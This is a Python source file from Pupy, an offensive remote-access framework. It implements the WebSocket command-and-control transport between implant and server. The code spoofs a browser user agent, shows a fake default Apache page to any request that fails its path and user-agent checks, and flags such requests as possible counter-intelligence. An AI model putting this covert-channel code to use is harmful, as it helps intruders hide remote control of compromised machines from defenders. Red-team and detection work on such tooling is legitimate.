# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

""" This module contains an implementation of the 'websocket' transport for pupy.

    Lots of the WebSocket protocol code came from https://github.com/Pithikos/python-websocket-server
"""

__all__ = (
    'InvalidHTTPReq', 'MalformedData', 'MissingData',
    'paths', 'UA',
    'PupyWebSocketTransport',
    'PupyWebSocketClient', 'PupyWebSocketServer'
)

import time
import base64
import struct
import random
import string
import re
from hashlib import sha1

from ..base import BasePupyTransport

from network.lib import getLogger
logger = getLogger('ws')

class InvalidHTTPReq(Exception):
    __slots__ = ()

class MalformedData(Exception):
    __slots__ = ()

class MissingData(Exception):
    __slots__ = ()

# IOCs: These should change per engagement.
paths = [
    "/wsapp"
]

# Also update conf.py in network/transports/websocket/
UA = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"

error_response_body="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""
error_response="HTTP/1.1 200 OK\r\n"
error_response+="Server: Apache\r\n"
error_response+="Content-Type: text/html; charset=utf-8\r\n"
error_response+="Content-Length: %s\r\n"%len(error_response_body)
error_response+="\r\n"
error_response+=error_response_body

FIN                 = 0x80
OPCODE              = 0x0f
MASKED              = 0x80
PAYLOAD_LEN         = 0x7f
PAYLOAD_LEN_EXT16   = 0x7e
PAYLOAD_LEN_EXT64   = 0x7f
PAYLOAD_LEN_MAX     = 18446744073709551616
OPCODE_CONTINUATION = 0x0
OPCODE_TEXT         = 0x1
OPCODE_BINARY       = 0x2
OPCODE_CLOSE_CONN   = 0x8
OPCODE_PING         = 0x9
OPCODE_PONG         = 0xA

class PupyWebSocketTransport(BasePupyTransport):
    """
    Implements the http protocol transport for pupy.
    """
    __slots__ = ()

class PupyWebSocketClient(PupyWebSocketTransport):
    client=True
    method="GET"
    missing_bytes=0
    path=random.choice(paths)
    socketkey=''.join(random.sample(string.printable,16))
    mask=''.join(random.sample(string.printable,4))
    user_agent=UA
    host="www.example.com" # None for random

    __slots__ = (
        'method', 'path', 'user_agent', 'socketkey',
        'missing_bytes'
    )

    def __init__(self, *args, **kwargs):
        PupyWebSocketTransport.__init__(self, *args, **kwargs)

    def on_connect(self):
        payload = "%s %s HTTP/1.1\r\n" % (self.method, self.path)
        payload += "Host: %s\r\n" % (self.host)
        payload += "User-Agent: %s\r\n" % (self.user_agent)
        payload += "Upgrade: websocket\r\n"
        payload += "Connection: Upgrade\r\n"
        payload += "Sec-WebSocket-Key: %s\r\n" % (base64.b64encode(self.socketkey))
        payload += "Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n"
        payload += "Sec-WebSocket-Version: 13\r\n\r\n"
        self.downstream.write(payload)
        time.sleep(1)

    def upstream_recv(self, data):
        """
            raw data to websocket frame
            Encoding Client -> Server
            mask the data
        """

        try:
            d=data.peek()
            header = bytearray()
            payload_len = len(d)

            header.append(OPCODE_TEXT)
            if payload_len < PAYLOAD_LEN_EXT16:
                header.append(payload_len | MASKED)
            elif payload_len >= PAYLOAD_LEN_EXT16 and payload_len <= 65535:
                header.append(PAYLOAD_LEN_EXT16 | MASKED)
                header.extend(struct.pack(">H", payload_len))
            elif payload_len < PAYLOAD_LEN_MAX:
                header.append(PAYLOAD_LEN_EXT64 | MASKED)
                header.extend(struct.pack(">Q", payload_len))
            else:
                raise Exception("Message too large to send without fragmentation")

            header.extend(self.mask)
            encoded = ""
            for ch in d:
                ch = ord(ch) ^ ord(self.mask[len(encoded) % 4])
                encoded += chr(ch)
            self.downstream.write(str(header) + encoded)
            data.drain(payload_len)
        except ValueError as e:
            logger.debug(e)

    def downstream_recv(self, data):
        """
            Decoding Server -> Client
            Non masked messages
        """
        d=data.peek()
        decoded=b""
        #let's parse HTTP responses :
        if d.startswith("HTTP/1.1 ") and "\r\n\r\n" in d:
            data.drain(len(d))
            logger.debug("Received upgrade response")
            return
        while len(d)>0:
            d = data.peek()
            if not (d.startswith("HTTP/1.1 ") and "\r\n\r\n" in d):
                try:
                    # Don't decode header, if we have incomplete data
                    if self.missing_bytes > 0:
                        raise MissingData("Missing bytes")

                    # Parse out Websocket header
                    b1 = ord(d[0])
                    b2 = ord(d[1])
                    data.drain(2)
                    d=d[2:]

                    opcode = b1 & OPCODE
                    masked = b2 & MASKED
                    payload_len = b2 & PAYLOAD_LEN

                    if not b1:
                        raise Exception("Client closed connection")
                    elif opcode == OPCODE_CLOSE_CONN:
                        raise Exception("Client asked to close connection")
                    elif opcode == OPCODE_CONTINUATION:
                        raise Exception("Continuation frames not currently supported")
                    elif opcode == OPCODE_BINARY:
                        raise Exception("Binary frames are not supported")
                    elif opcode == OPCODE_PING:
                        raise Exception("Pings not supported")
                    elif opcode == OPCODE_PONG:
                        raise Exception("Pongs not supported")
                    elif masked:
                        raise Exception("Server shouldn't be masking messages")

                    if payload_len == PAYLOAD_LEN_EXT16:
                        payload_len = struct.unpack(">H", d[:2])[0]
                        data.drain(2)
                        d=d[2:]
                    elif payload_len == PAYLOAD_LEN_EXT64:
                        payload_len = struct.unpack(">Q", d[:8])[0]
                        data.drain(8)
                        d=d[8:]

                    self.missing_bytes = max(0, payload_len - len(d))

                    decoded += d[:payload_len]
                    data.drain(payload_len)
                    d=d[payload_len:]
                except MissingData:
                    logger.debug("Missing: %d Have: %d" % (self.missing_bytes, len(d)))
                    self.missing_bytes -= max(0, len(d))
                    decoded = d
                    data.drain(len(d))
                except Exception as e:
                    logger.debug(e)
        if decoded:
            self.upstream.write(decoded)

class PupyWebSocketServer(PupyWebSocketTransport):
    client=False
    verify_user_agent=UA # set to the user agent to verify or None not to verify
    missing_bytes=0
    decoded_len=0
    mask=""

    __slots__ = (
        'verify_user_agent', 'missing_bytes',
        'mask', 'decoded_len'
    )

    def __init__(self, *args, **kwargs):
        PupyWebSocketTransport.__init__(self, *args, **kwargs)

    def calculate_response_key(self, key):
        GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
        hsh = sha1(key.encode() + GUID.encode())
        response_key = base64.b64encode(hsh.digest()).strip()
        return response_key.decode('ASCII')

    def bad_request(self, msg):
        logger.debug(msg)
        self.downstream.write(error_response)
        self.close(0)

    def upstream_recv(self, data):
        """
            Encoding server -> client messages
            Messsages shouldn't be masked
        """
        try:
            if self.closed:
                return
            d=data.peek()
            header = bytearray()
            payload_len = len(d)

            header.append(OPCODE_TEXT)
            if payload_len < PAYLOAD_LEN_EXT16:
                header.append(payload_len)
            elif payload_len >= PAYLOAD_LEN_EXT16 and payload_len <= 65535:
                header.append(PAYLOAD_LEN_EXT16)
                header.extend(struct.pack(">H", payload_len))
            elif payload_len < PAYLOAD_LEN_MAX:
                header.append(PAYLOAD_LEN_EXT64)
                header.extend(struct.pack(">Q", payload_len))
            self.downstream.write(str(header) + d)
            data.drain(payload_len)
        except Exception as e:
            logger.debug(e)

    def downstream_recv(self, data):
        """
            Decoding client -> server messages
            Message should be masked coming from client
        """
        d=data.peek()
        # Handle HTTP GET requests, strip websocket keys, verify UA etc
        if d.startswith("GET "):
            path = d.split(' ', 2)[1]
            if path not in paths:
                self.bad_request('Path does not match!')
                return
            key = re.search('\n[sS]ec-[wW]eb[sS]ocket-[kK]ey[\s]*:[\s]*(.*)\r\n', d)
            if key:
                key = key.group(1)
            else:
                self.bad_request('Unable to get WebSocketKey')
                return

            if self.verify_user_agent:
                ua = re.search('\n[uU]ser-[aA]gent:[\s]*(.*)\r\n', d)
                if ua:
                    ua = ua.group(1)
                else:
                    self.bad_request('No User-Agent provided')
                    return
                if ua != self.verify_user_agent:
                    self.bad_request('Bad User-Agent provided. May be counter-intel')
                    return

            payload = "HTTP/1.1 101 Switching Protocols\r\n"
            payload += "Upgrade: websocket\r\n"
            payload += "Connection: Upgrade\r\n"
            payload += "Sec-WebSocket-Accept: %s\r\n" % (self.calculate_response_key(key))
            payload += "\r\n"
            self.downstream.write(payload)
            data.drain(len(d))
            return

        while len(d)>0:
            d=data.peek()
            try:
                decoded = ""
                if self.missing_bytes > 0:
                    raise MissingData('Should be continuation')

                b1 = ord(d[0])
                b2 = ord(d[1])
                d=d[2:]
                data.drain(2)

                opcode = b1 & OPCODE
                payload_len = b2 & PAYLOAD_LEN

                if not b1:
                    raise Exception("Client closed connection")
                elif opcode == OPCODE_CLOSE_CONN:
                    raise Exception("Client asked to close connection")
                elif opcode == OPCODE_CONTINUATION:
                    raise Exception("Continuation frames not currently supported")
                elif opcode == OPCODE_BINARY:
                    raise Exception("Binary frames are not supported")
                elif opcode == OPCODE_PING:
                    raise Exception("Pings not supported")
                elif opcode == OPCODE_PONG:
                    raise Exception("Pongs not supported")

                if payload_len == PAYLOAD_LEN_EXT16:
                    payload_len = struct.unpack(">H", d[:2])[0]
                    data.drain(2)
                    d=d[2:]
                elif payload_len == PAYLOAD_LEN_EXT64:
                    payload_len = struct.unpack(">Q", d[:8])[0]
                    data.drain(8)
                    d=d[8:]
                self.mask = d[:4]
                d=d[4:]
                data.drain(4)
                for ch in d[:payload_len]:
                    ch = ord(ch) ^ ord(self.mask[len(decoded) % 4])
                    decoded += chr(ch)

                # May not have the full frame
                self.missing_bytes = max(0, payload_len - len(d))
                self.decoded_len = len(decoded)

                self.upstream.write(decoded)
                data.drain(payload_len)
                d=d[payload_len:]
            except MissingData:
                logger.debug("Missing: %d Have: %d" % (self.missing_bytes, len(d)))
                self.missing_bytes -= max(0, len(d))
                for ch in d:
                    ch = ord(ch) ^ ord(self.mask[(len(decoded)+self.decoded_len) % 4])
                    decoded += chr(ch)
                self.decoded_len += len(d)
                self.upstream.write(decoded)
                data.drain(len(d))
            except Exception as e:
                logger.debug(e)
